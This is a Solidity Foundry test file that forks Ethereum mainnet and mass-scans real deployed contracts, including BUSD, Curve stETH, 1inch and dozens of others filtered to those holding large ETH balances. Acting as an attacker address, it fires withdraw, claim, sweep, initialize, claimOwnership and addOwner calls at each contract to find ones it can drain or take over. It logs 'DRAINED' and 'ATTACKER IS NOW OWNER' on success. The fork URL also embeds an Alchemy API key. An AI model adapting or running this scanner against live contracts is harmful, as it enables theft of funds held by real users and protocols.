// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract MassContractScanner is Test {
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
    }

    function test_scanTokenContracts() public {
        console.log("=== SCANNING TOKEN CONTRACTS ===");

        // Known high-value token contracts from the list
        address[20] memory targets = [
            0x4faBB145d64652a948d72533023f6E7A623C7C53, // BUSD
            0x9A0C8Ff858d273f57072D714bca7411D717501D7, // st1INCH
            0xE295aD71242373C37C5FdA7B57F26f9eA1088AFe, // 1inch rewards
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4, // EarlyAdopterPool
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4, // DolaSavings
            0x82bA8da44Cd5261762e629dd5c605b17715727bd, // FraxQueue
            0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, // Curve stETH
            0x60cd862c9C687A9dE49aecdC3A99b74A4fc54aB6, // MoonCats
            address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0)
        ];

        for (uint t = 0; t < 8; t++) {
            address target = targets[t];
            if (target == address(0) || target.code.length == 0) continue;

            console.log("\n=== Target:", target, "===");
            console.log("ETH Balance:", target.balance / 1e18);

            // Check common patterns
            _checkOwnership(target);
            _checkPausable(target);
            _checkUpgradeable(target);
            _checkStakingRewards(target);
            _tryExploits(target);
        }
    }

    function _checkOwnership(address target) internal view {
        // Check owner
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            if (owner == address(0)) {
                console.log("!!! OWNER IS ZERO !!!");
            }
        }

        // Check pending owner (transferOwnership vulnerability)
        (s, d) = target.staticcall(abi.encodeWithSignature("pendingOwner()"));
        if (s && d.length >= 32) {
            address pending = abi.decode(d, (address));
            if (pending != address(0)) {
                console.log("Pending owner:", pending);
            }
        }
    }

    function _checkPausable(address target) internal view {
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("paused()"));
        if (s && d.length >= 32) {
            bool paused = abi.decode(d, (bool));
            console.log("Paused:", paused);
        }
    }

    function _checkUpgradeable(address target) internal view {
        // EIP1967 implementation slot
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(target, implSlot);

        if (impl != bytes32(0)) {
            address implAddr = address(uint160(uint256(impl)));
            console.log("Implementation:", implAddr);

            // Check if implementation is empty
            if (implAddr.code.length == 0) {
                console.log("!!! EMPTY IMPLEMENTATION - POTENTIAL VULN !!!");
            }

            // Check implementation for uninitialized storage
            (bool s, bytes memory d) = implAddr.staticcall(abi.encodeWithSignature("owner()"));
            if (s && d.length >= 32) {
                address implOwner = abi.decode(d, (address));
                if (implOwner == address(0)) {
                    console.log("!!! IMPL OWNER IS ZERO !!!");
                }
            }
        }
    }

    function _checkStakingRewards(address target) internal view {
        // Check for abnormal reward rates
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("rewardRate()"));
        if (s && d.length >= 32) {
            uint256 rate = abi.decode(d, (uint256));
            console.log("Reward rate:", rate);
        }

        // Check for reward per token
        (s, d) = target.staticcall(abi.encodeWithSignature("rewardPerToken()"));
        if (s && d.length >= 32) {
            uint256 rpt = abi.decode(d, (uint256));
            if (rpt > 1e30) {
                console.log("!!! EXTREMELY HIGH rewardPerToken:", rpt / 1e18);
            }
        }

        // Check earned without staking
        (s, d) = target.staticcall(abi.encodeWithSignature("earned(address)", attacker));
        if (s && d.length >= 32) {
            uint256 earned = abi.decode(d, (uint256));
            if (earned > 0) {
                console.log("!!! EARNED WITHOUT STAKING:", earned);
            }
        }
    }

    function _tryExploits(address target) internal {
        uint256 balBefore = attacker.balance;

        // Try all common exploit functions
        vm.prank(attacker);
        target.call(abi.encodeWithSignature("claimOwnership()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("acceptOwnership()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("initialize()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("initialize(address)", attacker));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("init()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("withdraw()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("emergencyWithdraw()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("claim()"));

        vm.prank(attacker);
        target.call(abi.encodeWithSignature("getReward()"));

        if (attacker.balance > balBefore) {
            console.log("!!! EXPLOIT FOUND - Gained:", (attacker.balance - balBefore) / 1e18, "ETH");
        }
    }

    function test_scanAllFromList() public {
        console.log("=== MASS SCANNING CONTRACTS FROM LIST ===");

        // First 50 addresses from contracts.txt
        address[50] memory targets = [
            0x4618c019A0ed3b1B560ebc3Cc80ee4EB52c96230,
            0xa32FF8ca08036337fABf50FA029812361Cd176c8,
            0x8Fb1a35Bb6fB9c47fB5065be5062cB8dC1687669,
            0xc5CfaDa84E902aD92DD40194f0883Ad49639B023,
            0xD46DF541148932690B81092F600f35208afd4325,
            0x5A0748f8D40B7884E182FC4994D8d4a115a8CbF7,
            0xa08C1134cDD73aD41889F7f914eCC4D3b30C1333,
            0xc32050abAc7DbFef4FC8DC7b96D9617394cB4E1b,
            0x7100c7cE94607EF68983F133cfD59Cc1833a115d,
            0x08a90Fe0741b7DeF03Fb290cc7b273f1855767d8,
            0xA4fc358455Febe425536fd1878bE67FfDBDEC59a,
            0x4f2bC163c8758D7F88771496F7B0Afde767045F3,
            0x77b53b6F45592f5e88cecEC4Ff2Cd968E1C46Bee,
            0x2F9f02F2ba99FF5c750f95Cf27D25352f71cd6A9,
            0xa919341942C858290B95E2D1DC6a6F6f36C23266,
            0x83eB2094072f6Ed9F57D3f19f54820ee0BaE6084,
            0xA1A111BC074C9cfA781f0c38e63bd51C91B8af00,
            0x142fDeF3d4B26D7152Ef808c3b147754216Ccb36,
            0xe3412D2751f6CFA117A4c5eb71e84aA63a5ee5ff,
            0x897c03A77039c31dF13F3c632b7E46191839bbac,
            0x8392f6669292fA56123F71949b52d883ae57e225,
            0xa61BeB4A3d02decb01039e378237032B351125B4,
            0x7b4A7fD41c688A7CB116534E341E44126Ef5A0fD,
            0xcc50953A743b9CE382f423e37B07efA6F9D9b000,
            0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E,
            0xda1FD36CfC50ED03ca4DD388858A78c904379fb3,
            0xE295aD71242373C37C5FdA7B57F26f9eA1088AFe,
            0xab73EC65A1ef5A2e5b56d5d6F36Bee4B2A1D3FFb,
            0xf74Bf048138A2B8f825eCcaBED9e02e481A0F6C0,
            0x0f30c808069315B3B7DFbfE149c87448B50c6D8b,
            0xF35A92585Ceee7251388E14f268D9065f5206207,
            0x9dE9773a77a9b51330736E73429622Cc32f51926,
            0xDbFb513d25DF56b4C3f5258d477A395D4B735824,
            0x0D29aDA4c818A9f089107201EAcc6300e56E0D5C,
            0xecE0F32840280Ad0069DD89aD97aD6dF1bB0ff2a,
            0x3F9078b8FbCb1C4e03b41fA9E5a0532a28848Db7,
            0x5B5cfe992AdaC0C9D48E05854B2D91C73a003858,
            0xB958A8F59aC6145851729F73C7a6968311d8B633,
            0xd3d13A578a53685b4aC36A1bAb31912D2b2A2f36,
            0xB54CA24AC19098Db42454C8EE8dF67D260A22b1e,
            0xBbBaf1aDf4D39B2843928CCA1e65564e5ce99CcC,
            0x469eDA64aed3A3aD6f868c44564291aA415cB1d9,
            0x3a3FBa79302144f06f49fFdE69cE4b7F6ad4Dd3D,
            0xe9778E69a961E64d3Cdbb34cF6778281d34667c2,
            0xbD17B1CE622d73BD438b9E658aCA5996dc394B0d,
            0xe22D44c58A076749cadAC6C97402a3818cA5F39a,
            0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B,
            0xF92cD566ea4864356c5491c177A430C222d7e678,
            0x7E5B6DD9BA1aBF42bfB41E5AE8f46fe5e01aAe14,
            0xD48b633045AF65fF636F3c6eDd744748351E020d
        ];

        for (uint t = 0; t < 50; t++) {
            address target = targets[t];
            if (target == address(0)) continue;

            uint256 bal = target.balance;
            if (bal < 50 ether) continue;
            if (target.code.length == 0) continue;

            console.log("\n--- Target:", target);
            console.log("Balance:", bal / 1e18, "ETH");

            // Quick vulnerability check
            uint256 attackerBefore = attacker.balance;

            // Try common drain patterns
            _quickDrainAttempt(target);

            if (attacker.balance > attackerBefore) {
                console.log("!!! DRAINED:", (attacker.balance - attackerBefore) / 1e18, "ETH !!!");
            }
        }
    }

    function _quickDrainAttempt(address target) internal {
        bytes4[20] memory funcs = [
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("claim()")),
            bytes4(keccak256("claimOwnership()")),
            bytes4(keccak256("acceptOwnership()")),
            bytes4(keccak256("initialize()")),
            bytes4(keccak256("init()")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("getReward()")),
            bytes4(keccak256("exit()")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("sweep(address)")),
            bytes4(keccak256("collect()")),
            bytes4(keccak256("refund()")),
            bytes4(keccak256("release()")),
            bytes4(keccak256("withdrawAll()")),
            bytes4(keccak256("execute(address,uint256,bytes)")),
            bytes4(keccak256("transfer(address,uint256)")),
            bytes4(keccak256("call(address,uint256,bytes)")),
            bytes4(keccak256("initWallet(address[],uint256,uint256)")),
            bytes4(keccak256("addOwner(address)"))
        ];

        for (uint i = 0; i < 20; i++) {
            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i]));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], attacker));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], target.balance));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], attacker, target.balance, ""));
        }
    }

    function test_findUninitializedProxies() public {
        console.log("=== FINDING UNINITIALIZED PROXIES ===");

        address[30] memory targets = [
            0x4618c019A0ed3b1B560ebc3Cc80ee4EB52c96230,
            0xa32FF8ca08036337fABf50FA029812361Cd176c8,
            0x8Fb1a35Bb6fB9c47fB5065be5062cB8dC1687669,
            0xc5CfaDa84E902aD92DD40194f0883Ad49639B023,
            0xD46DF541148932690B81092F600f35208afd4325,
            0x5A0748f8D40B7884E182FC4994D8d4a115a8CbF7,
            0xa08C1134cDD73aD41889F7f914eCC4D3b30C1333,
            0xc32050abAc7DbFef4FC8DC7b96D9617394cB4E1b,
            0x7100c7cE94607EF68983F133cfD59Cc1833a115d,
            0x08a90Fe0741b7DeF03Fb290cc7b273f1855767d8,
            0xA4fc358455Febe425536fd1878bE67FfDBDEC59a,
            0x4f2bC163c8758D7F88771496F7B0Afde767045F3,
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4,
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4,
            0xDC24316b9AE028F1497c275EB9192a3Ea0f67022,
            0x9A0C8Ff858d273f57072D714bca7411D717501D7,
            0x82bA8da44Cd5261762e629dd5c605b17715727bd,
            0x60cd862c9C687A9dE49aecdC3A99b74A4fc54aB6,
            address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0)
        ];

        // EIP1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);

        for (uint t = 0; t < 18; t++) {
            address target = targets[t];
            if (target == address(0) || target.code.length == 0) continue;
            if (target.balance < 10 ether) continue;

            bytes32 impl = vm.load(target, implSlot);
            bytes32 admin = vm.load(target, adminSlot);

            if (impl != bytes32(0)) {
                address implAddr = address(uint160(uint256(impl)));

                console.log("\n--- Proxy:", target);
                console.log("Balance:", target.balance / 1e18, "ETH");
                console.log("Implementation:", implAddr);

                // Check if we can initialize
                vm.prank(attacker);
                (bool s,) = target.call(abi.encodeWithSignature("initialize()"));
                if (s) console.log("initialize() callable");

                vm.prank(attacker);
                (s,) = target.call(abi.encodeWithSignature("initialize(address)", attacker));
                if (s) console.log("initialize(address) callable");

                // Check owner after init attempt
                bytes memory d;
                (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
                if (s && d.length >= 32) {
                    address owner = abi.decode(d, (address));
                    if (owner == attacker) {
                        console.log("!!! ATTACKER IS NOW OWNER !!!");
                    }
                }
            }
        }
    }
}
